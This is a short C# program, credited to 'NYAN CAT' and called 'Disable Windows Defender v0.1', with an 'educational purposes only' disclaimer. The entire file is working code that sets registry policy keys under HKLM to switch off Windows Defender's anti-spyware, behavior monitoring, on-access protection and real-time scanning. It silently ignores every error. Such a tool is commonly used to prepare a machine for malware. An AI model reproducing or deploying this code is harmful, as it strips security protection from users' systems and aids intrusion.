using Microsoft.Win32;
using System;


//       │ Author     : NYAN CAT
//       │ Name       : Disable Windows Defender v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only. 

namespace Disable_Windows_Defender
{
    class Program
    {
        static void Main()
        {
            try
            {
                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableAntiSpyware", "00000001", RegistryValueKind.DWord);
            }
            catch { }

            try
            {
                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableBehaviorMonitoring", "00000001", RegistryValueKind.DWord);

                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableOnAccessProtection", "00000001", RegistryValueKind.DWord);

                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableScanOnRealtimeEnable", "00000001", RegistryValueKind.DWord);
            }
            catch { }
        }
    }
}
